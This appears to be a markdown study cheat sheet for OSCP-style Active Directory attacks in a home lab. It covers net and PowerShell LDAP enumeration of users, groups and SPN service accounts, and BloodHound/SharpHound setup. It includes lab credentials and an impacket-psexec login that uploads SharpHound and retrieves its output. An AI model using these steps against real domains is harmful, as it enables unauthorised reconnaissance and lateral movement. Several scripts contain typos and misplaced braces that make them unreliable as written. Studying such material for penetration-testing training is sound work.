# ACTIVE DIRECTORY ATTACKS
Following are some important commands and techniques useful for OSCP preparation

## DOMAIN PENTEST ENVIRONMENT
### DOMAIN MACHINES 
> link
(https://github.com/Hellsender01/Youtube/blob/main/Active%20Directory/Passwords.md)
```
rgreen/DirtyPassword23
rgeller/Password123!@#
```

### KALI LINUX

```
/var/www/html/ad_tools
pass.txt     
SharpHound.exe  
svc_hash
mimikatz.exe  
mimidrv.sys
mimilib.dll   
PsExec64.exe  
shell-x64.exe
```

### MACHINE COMPROMISE SIMULATE

```
RDP

IMPACKET (PASSWORD)

IMPACKET (HASH)
```



## DOMAIN ENUMERATION TECHNIQUES

### NET BINARY

```
net user
net localgroup 
net users test1

net user /domain
net group /domain
net user cbing /domain
net groups /domain "Domain Admins"
```


### POWERSHELL

>Following are some popular powersellscripts used for AD enumeraion

+ DISTINGUISHED NAME

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
```

+ LDAP PROVIDER PATH

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
$SearchString
```

+ DIRECTORY SEARCHER CLASS PREPERATION

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) 
$objDomain = New-Object System.DirectoryServices.DirectoryEntry 
$Searcher.SearchRoot = $objDomain
```

+ DOMAIN USERS

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) 
$objDomain = New-Object System.DirectoryServices.DirectoryEntry 
$Searcher.SearchRoot = $objDomain 
$Searcher.filter="samAccountType=805306368"
$Searcher.FindAll()
```

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
$PDC = ($domainObj.PdcRoleOwner).Name 
$SearchString = "LDAP://" 
$SearchString += $PDC + "/" 
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
$SearchString += $DistinguishedName 
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368" 
$Result= $Searcher.FindAll() 
Foreach ($obj in $Result) 
{ 
Foreach($prop in $obj.Properties) 
{ 
$prop 
} 
Write-Host "------------------------"
}
```

+ DOMAIN GROUPS

```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result= $Searcher.FindAll()
Foreach ($obj in $Result)
{
$obj.Properties.name
}
```

+ NESTED GROUPS - USERS/GROUPS INSIDE GROUPS

```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$0istinguishedName = "DC=$($domain0bj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Administrators)"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```
```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$0istinguishedName = "DC=$($domain0bj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=test_group)"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$0istinguishedName = "DC=$($domain0bj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=Nested_group)"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

```
$domain0bj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domain0bj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(name=another_Nested-group)"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
$obj.Properties.member
}
```

+ SERVICE ACCOUNTS ENUMERATION VIA SERVICE PRINCIPAL NAMES 

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
}
Foreach($prop in $obj.Properties)
{
$prop
}
```

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher= New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*backup*"
$Result= $Searcher.FindAll()
Foreach($obj in $Result)
{
}
Foreach($prop in $obj.Properties)
{
$prop
}
```

### BLOOD HOUND / SHARP HOUND

#### BLOODHOUND SETUP / KALI
```
sudo apt update && sudo apt install -y bloodhound
sudo neo4j start
```
>cred:neo4j/neo4j
```
http://localhost:7474/browser/
```
>change cred: neo4j/test

>bloodhound start

#### BLOODHOUND USAGE - SCENARIO 1

+ Windows Level Working 
```
cmd.exe
Sharphound.exe
```

+ Kali Level Working
```
sudo neo4j start
```
>bloodhound start

>login with neo4j/test

>import sharphound file
 
>clear database - to clear previous results imported into bloodhound

#### BLOODHOUND USAGE - SCENARIO 2

+ Kali Level Working
```
impacket-psexec 'FRIENDS/rgeller:Password123!@#@192.168.174.129'
lput SharpHound.exe
cd ..
SharpHound.exe
dir
20230106123630_BloodHound.zip
lget 20230106123630_BloodHound.zip
```



